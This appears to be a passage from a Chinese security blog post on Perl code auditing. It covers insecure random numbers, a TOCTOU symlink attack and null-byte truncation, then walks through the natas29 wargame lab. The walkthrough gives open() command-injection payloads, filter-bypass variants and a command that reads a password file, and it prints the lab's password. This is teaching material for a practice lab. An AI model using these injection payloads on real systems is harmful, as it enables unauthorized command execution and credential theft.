+<h3 id="随机数安全"><a href="#随机数安全" class="headerlink" title="随机数安全"></a>随机数安全</h3><p>Perl中的rand()函数只是从标准C库中调用相应的rand()函数，而C库函数rand()是一个不安全随机函数、其生成的数字不是加密安全的。</p>
+<p>在C/C++安全编码规范中也明确禁止使用rand()产生用于安全用途的伪随机数。</p>
+<p>强伪随机数CSPRNG（安全可靠的伪随机数生成器(Cryptographically Secure Pseudo-Random Number Generator）的各种参考：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Platform</th>
+<th style="text-align:left">CSPRNG</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP</td>
+<td style="text-align:left">mcrypt_create_iv, openssl_random_pseudo_bytes</td>
+</tr>
+<tr>
+<td style="text-align:left">Java</td>
+<td style="text-align:left">java.security.SecureRandom</td>
+</tr>
+<tr>
+<td style="text-align:left">Dot NET (C#, VB)</td>
+<td style="text-align:left">System.Security.Cryptography.RNGCryptoServiceProvider</td>
+</tr>
+<tr>
+<td style="text-align:left">Ruby</td>
+<td style="text-align:left">SecureRandom</td>
+</tr>
+<tr>
+<td style="text-align:left">Python</td>
+<td style="text-align:left">os.urandom</td>
+</tr>
+<tr>
+<td style="text-align:left">Perl</td>
+<td style="text-align:left">Math::Random::Secure</td>
+</tr>
+<tr>
+<td style="text-align:left">C/C++ (Windows API)</td>
+<td style="text-align:left">CryptGenRandom</td>
+</tr>
+<tr>
+<td style="text-align:left">Any language on GNU/Linux or Unix</td>
+<td style="text-align:left">Read from /dev/random or /dev/urandom</td>
+</tr>
+</tbody>
+</table>
+<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>条件竞争漏洞的根源在于两个逻辑相关的操作之间的执行存在时间差，而攻击者可以利用这个时间差来绕过某些逻辑实现攻击。</p>
+<p>比如这段代码，先判断目标文件是否存在，如果不存在则创建并写入内容：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unless</span> (-e <span class="string">"/tmp/a_temporary_file"</span>) &#123;</span><br><span class="line">	<span class="keyword">open</span> (FH, <span class="string">"&gt;/tmp/a_temporary_file"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在这种情况下，这个时间差是指TOCTOU（检查时间-使用时间）。这里检测文件是否存在和打开写入文件两个操作之间存在一个时间差。如果攻击者利用这个时间差，在程序检测到文件不存在后就立即执行如下命令创建软链接到某个重要配置文件，如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /tmp/a_temporary_file /etc/an_important_config_file</span><br></pre></td></tr></table></figure>
+<p>此时，程序过完这个时间差再来执行打开写入目标文件的操作时，由于目标文件已经被攻击者篡改为软链接因此会导致该重要配置文件被删除。</p>
+<p>通常，最好的解决方法是在可能存在竞争条件的地方使用原子操作。这意味着仅使用一个系统调用即可检查文件并同时创建该文件，而不会给处理器提供机会在两者之间切换到另一个进程。</p>
+<p>在刚刚的示例中，可以使用sysopen()函数并指定只写模式，而无需设置truncate标志来避免条件竞争的问题：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unless</span> (-e <span class="string">"/tmp/a_temporary_file"</span>) &#123;</span><br><span class="line">    <span class="comment">#open (FH, "&gt;/tmp/a_temporary_file"); </span></span><br><span class="line">    <span class="keyword">sysopen</span> (FH, <span class="string">"/tmp/a_temporary_file"</span>, O_WRONLY);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样，即使文件名被篡改了，但是当打开文件进行写入时也不会杀死它。</p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h3><p>类似PHP，Perl中也存在00截断的问题。</p>
+<p>如下代码，假设file变量值”xxx”是外部可控的值，程序本意是想打开用户输入的值拼接上”.txt”后缀名的文件：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="string">"xxx"</span>;  </span><br><span class="line"><span class="keyword">open</span>(FILE, <span class="string">"$file.txt"</span>);</span><br></pre></td></tr></table></figure>
+<p>此时，如果攻击者输入<code>test%00</code>，此时由于%00在URL解码变为0x00，其在Perl中代表了字符串的结束，因此open()函数打开的是”test”文件而不是”test.txt”文件。</p>
+<p>当然，00截断的特性通常是结合其他漏洞进行组合绕过利用的，具体场景具体分析。</p>
+<h2 id="0x03-Perl漏洞实战"><a href="#0x03-Perl漏洞实战" class="headerlink" title="0x03 Perl漏洞实战"></a>0x03 Perl漏洞实战</h2><p>看个Perl漏洞靶场：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://natas29.natas.labs.overthewire.org</span><br><span class="line">username:natas29</span><br><span class="line">password:airooCaiseiyee8he8xongien9euhe8b</span><br></pre></td></tr></table></figure>
+<p>访问目标站点，可以选择下拉框选项，这里点击”perl underground”后页面返回大量内容：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/23.png" alt=""></p>
+<p>注意到参数名为file，推测后台是根据传入的参数名再传递给open()函数来打开处理。</p>
+<p>尝试下open()函数的命令注入，输入<code>|ls</code>，注意管道符在前面是有回显的：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/24.png" alt=""></p>
+<p>风平浪静，肯定是姿势不对。推测下原因，用open()函数打开的文件一般是要有后缀名的，而选项中的这几个file参数值都是不带后缀名的，那么就应该是后台对file参数值和后缀名进行一个拼接操作再open的。如果是这样，就能利用%00截断来截断掉后面拼接的后缀名使open()函数能够正确执行注入的命令。</p>
+<p>输入<code>|ls%00</code>：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/25.png" alt=""></p>
+<p>没毛病，通过%00截断的方式命令成功执行了，页面列出了当前目录下的所有文件。</p>
+<p>我们看下index.pl的源码，输入<code>|cat index.pl%00</code>：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/26.png" alt=""></p>
+<p>页面不太好看，直接看页面源码就得到index.pl的源码了：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> CGI <span class="string">qw(:standard)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> &lt;&lt;END;</span><br><span class="line">Content-Type: text/html; charset=iso-<span class="number">8859</span>-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//W3C//DTD HTML 4.01//EN"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;!-- This stuff in the header has nothing to <span class="keyword">do</span> with the level --&gt;</span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"http://natas.labs.overthewire.org/css/level.css"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"stylesheet"</span> href=<span class="string">"http://natas.labs.overthewire.org/css/jquery-ui.css"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"stylesheet"</span> href=<span class="string">"http://natas.labs.overthewire.org/css/wechall.css"</span> /&gt;</span><br><span class="line">&lt;script src=<span class="string">"http://natas.labs.overthewire.org/js/jquery-1.9.1.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src="http:/</span><span class="regexp">/natas.labs.overthewire.org/js</span><span class="regexp">/jquery-ui.js"&gt;&lt;/script</span>&gt;</span><br><span class="line">&lt;script src=http:<span class="regexp">//natas</span>.labs.overthewire.org/js/wechall-data.js&gt;&lt;<span class="regexp">/script&gt;&lt;script src="http:/</span><span class="regexp">/natas.labs.overthewire.org/js</span><span class="regexp">/wechall.js"&gt;&lt;/script</span>&gt;</span><br><span class="line">&lt;script&gt;var wechallinfo = &#123; <span class="string">"level"</span>: <span class="string">"natas29"</span>, <span class="string">"pass"</span>: <span class="string">"airooCaiseiyee8he8xongien9euhe8b"</span> &#125;;&lt;<span class="regexp">/script&gt;&lt;/head</span>&gt;</span><br><span class="line">&lt;body oncontextmenu=<span class="string">"javascript:alert('right clicking has been blocked!');return false;"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#content &#123;</span></span><br><span class="line">    width: <span class="number">1000</span>px;</span><br><span class="line">&#125;</span><br><span class="line">pre&#123;</span><br><span class="line">    background-color: <span class="comment">#000000; </span></span><br><span class="line">    color: <span class="comment">#00FF00; </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/style&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;h1&gt;natas29&lt;/h</span>1&gt;</span><br><span class="line">&lt;div id=<span class="string">"content"</span>&gt;</span><br><span class="line">END</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># morla /10111</span></span><br><span class="line"><span class="comment"># '$_=qw/ljttft3dvu&#123;/,s/./print chr ord($&amp;)-1/eg'</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># credits for the previous level go to whoever </span></span><br><span class="line"><span class="comment"># created insomnihack2016/fridginator, where i stole the idea from. </span></span><br><span class="line"><span class="comment"># that was a fun challenge, Thanks! </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> &lt;&lt;END;</span><br><span class="line">H3y K1dZ,&lt;br&gt;</span><br><span class="line"><span class="keyword">y</span><span class="number">0</span> rEm3mB3rz p3Rl rit3?&lt;br&gt;</span><br><span class="line">\\/\\/<span class="number">4</span>Nn4 g<span class="number">0</span> olD5kewL? R3aD Up!&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"index.pl"</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">select</span> name=<span class="string">"file"</span> onchange=<span class="string">"this.form.submit()"</span>&gt;</span><br><span class="line">  &lt;option value=<span class="string">""</span>&gt;s3lEcT suMp1n!&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">  &lt;option value="perl underground"&gt;perl underground&lt;/option</span>&gt;</span><br><span class="line">  &lt;option value=<span class="string">"perl underground 2"</span>&gt;perl underground <span class="number">2</span>&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">  &lt;option value="perl underground 3"&gt;perl underground 3&lt;/option</span>&gt;</span><br><span class="line">  &lt;option value=<span class="string">"perl underground 4"</span>&gt;perl underground <span class="number">4</span>&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">  &lt;option value="perl underground 5"&gt;perl underground 5&lt;/option</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/select&gt;</span></span><br><span class="line"><span class="regexp">&lt;/form</span>&gt;</span><br><span class="line"></span><br><span class="line">END</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(param(<span class="string">'file'</span>))&#123;</span><br><span class="line">    $f=param(<span class="string">'file'</span>);</span><br><span class="line">    <span class="keyword">if</span>($f=~<span class="regexp">/natas/</span>)&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"meeeeeep!&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">open</span>(FD, <span class="string">"$f.txt"</span>);</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">        <span class="keyword">while</span> (&lt;FD&gt;)&#123;</span><br><span class="line">            <span class="keyword">print</span> CGI::escapeHTML($_);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> &lt;&lt;END;</span><br><span class="line">&lt;div id=<span class="string">"viewsource"</span>&gt;c4n Y<span class="number">0</span> h4z s4uc3?&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/div</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/html</span>&gt;</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
+<p>从源码看到，关键的漏洞点就是<code>open(FD, &quot;$f.txt&quot;);</code>，这里直接将外部输入的file参数和后缀名”.txt”拼接后直接放进open()函数中执行，导致了命令注入漏洞的存在。</p>
+<p>靶场的要求是获得下一关即第30关的密码，这里看源码发现检测file参数值是否存在”natas”，因此需要结合一些shell技巧来绕过这个检测，可以输入如下一些命令绕过并搜索下一关的相关文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">|find / -name nat&apos;&apos;as30%00</span><br><span class="line">|find / -name nat&quot;&quot;as30%00</span><br><span class="line">|find / -name nat``as30%00</span><br><span class="line">|find / -name nat\as30%00</span><br><span class="line">|find / -name nat?s30%00</span><br><span class="line">|find / -name nat$&#123;x&#125;as30%00</span><br><span class="line">|find / -name nat$(echo a)s30%00</span><br><span class="line">|find / -name nat`echo a`s30%00</span><br><span class="line">|find / -name n$&#123;SHELLOPTS:2:1&#125;t$&#123;SHELLOPTS:2:1&#125;s30%00 # failed</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/27.png" alt=""></p>
+<p>最后读取该文件即可<code>|cat /etc/nat&#39;&#39;as_webpass/nat&#39;&#39;as30%00</code>：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/28.png" alt=""></p>
+<p>小结：该场景的漏洞点在于open()函数命令注入+%00截断。</p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.cgisecurity.com/lib/sips.html" target="_blank" rel="noopener">Security Issues in Perl Scripts</a></p>
+<p><a href="https://www.shellcodes.org/Perl/Perl%E5%AE%89%E5%85%A8.html" target="_blank" rel="noopener">Perl 安全</a></p>
+  
+    </div> 
+
+    
+
+    <div class="post-info-wrapper">
+            
+                    <!-- Post Info -->
+                    <p class="post-date">2020-11-24</p>
+                    
+                    
+
+                    
+            
+    </div>
+</article>
+
+
+    
+
+            </main>
+
+            <!-- 'To Top' Btn-->
+            
+                <div id="to-top">
+    <a href="#top" class="toTop">
+        <i class="fa fa-rocket"></i>
+    </a>
+</div>
+            
+
+            <!-- Footer -->
+            
+                <footer class="footer-wrapper col-xs-12 col-sm-12">
+    <div>
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div><br>
+</footer>
+            
+        </div>
+
+        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
+        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
+        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
+    </body>
+</html>
